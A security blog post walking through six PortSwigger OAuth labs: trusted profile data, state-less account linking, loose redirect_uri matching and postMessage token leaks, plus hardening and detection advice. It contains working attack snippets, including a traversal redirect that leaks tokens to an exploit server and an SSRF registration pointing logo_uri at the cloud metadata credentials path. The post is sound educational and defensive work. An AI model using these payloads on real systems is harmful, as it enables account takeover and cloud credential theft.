---
layout: post
title: "OAuth Security Is Binding"
date: 2026-06-29 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [oauth, oidc, redirect-uri, portswigger]
related_posts:
  - authentication-bugs-are-state-machine-bugs
  - business-logic-bugs-are-broken-invariants
  - information-leaks-are-missing-exploit-parameters
---

OAuth bugs often happen when everyone completes their own step correctly, but nobody binds the steps together.

The six PortSwigger OAuth labs are about binding:

- token to subject;
- code to client;
- redirect to exact registered URI;
- state to session and action;
- access token to audience;
- postMessage target to origin.

This series was re-run and live-verified on 2026-05-30 as 6/6 solved. One
operational detail mattered: the Academy exploit server expected the stored
response fields to be submitted again when delivering to the victim.

## The client must verify the subject

In the implicit-flow lab, the browser sends profile data to:

```http
POST /authenticate
```

The client trusts the submitted email. Change it to Carlos's email and the application logs in as Carlos.

That is the core failure: the client did not ask the identity provider, server-side, "which subject does this token actually represent?"

## Linking flows need state too

The profile-linking lab omits `state` on:

```text
/oauth-linking?code=...
```

The attacker generates a code for their own social profile, keeps it unused, then loads that callback inside the victim's authenticated session:

```html
<iframe src="https://LAB/oauth-linking?code=<attacker-code>"></iframe>
```

The victim's account is linked to the attacker's profile. This is CSRF in OAuth clothing.

## Redirect URI matching must be exact

When `redirect_uri` is arbitrary, authorization codes go wherever the attacker points them.

When `redirect_uri` allows traversal, the attacker may stay under the whitelisted origin but land on a dangerous client page:

```text
https://LAB/oauth-callback/../post/next?path=https://EXPLOIT-SERVER/exploit
```

If the flow is implicit, the access token arrives in the fragment. A small script can move it into a query parameter so it appears in the attacker's logs:

```js
window.location = '/?' + document.location.hash.substr(1)
```

## Client pages can become token proxies

The expert lab uses a page that posts its full URL to any parent origin:

```js
postMessage(window.location.href, '*')
```

Redirect the OAuth token to that page, iframe it from the exploit server, listen for the message, and the fragment leaks.

The rule is simple: never post token-bearing URLs to `*`.

## Dynamic registration creates server-side fetches

OpenID dynamic client registration can introduce SSRF when metadata URLs are fetched by the provider. A malicious client registers:

```json
{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

Fetching the client logo becomes a metadata request from the OAuth server.

## Defender notes

Hardening:

- validate user identity server-side with `/userinfo`;
- prefer authorization code flow with PKCE;
- require `state` on login, consent, and linking;
- bind code to client, exact redirect URI, session, and PKCE verifier;
- enforce exact redirect URI matching;
- restrict dynamic client registration and metadata URL fetches;
- avoid sending full token-bearing URLs through postMessage;
- scope and audience-bind access tokens.

Detection:

- `/authenticate` profile values that disagree with provider identity;
- callbacks or linking endpoints without `state`;
- `redirect_uri` with traversal, nested URLs, or open redirect parameters;
- dynamic registrations pointing to metadata or private IPs;
- OAuth authorization iframes from unexpected origins;
- `/me` calls with bearer tokens unrelated to the current session;
- postMessage payloads containing access tokens.

OAuth is not just a redirect dance. It is a set of bindings. Break one, and a valid login can become someone else's session.
